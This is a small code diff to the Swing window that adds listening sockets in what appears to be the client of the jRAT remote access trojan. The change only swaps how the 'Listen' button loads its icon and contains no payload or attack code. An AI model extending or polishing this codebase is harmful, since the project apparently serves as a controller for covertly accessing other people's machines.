@@ -8,7 +8,6 @@ import java.util.Random;
 import javax.swing.DefaultComboBoxModel;
 import javax.swing.GroupLayout;
 import javax.swing.GroupLayout.Alignment;
-import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JComboBox;
 import javax.swing.JFrame;
@@ -25,6 +24,7 @@ import se.jrat.client.net.PortListener;
 import se.jrat.client.net.ServerListener;
 import se.jrat.client.settings.Sockets;
 import se.jrat.client.ui.components.JPlaceholderTextField;
+import se.jrat.client.utils.IconUtils;
 import se.jrat.client.utils.Utils;
 import se.jrat.client.webpanel.WebPanelListener;
 
@@ -67,7 +67,7 @@ public class FrameAddSocket extends BaseFrame {
 		txtPass.setColumns(10);
 
 		JButton btnListen = new JButton("Listen");
-		btnListen.setIcon(new ImageIcon(FrameAddSocket.class.getResource("/icons/socket_add.png")));
+		btnListen.setIcon(IconUtils.getIcon("socket_add.png"));
 		btnListen.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				addSocket();
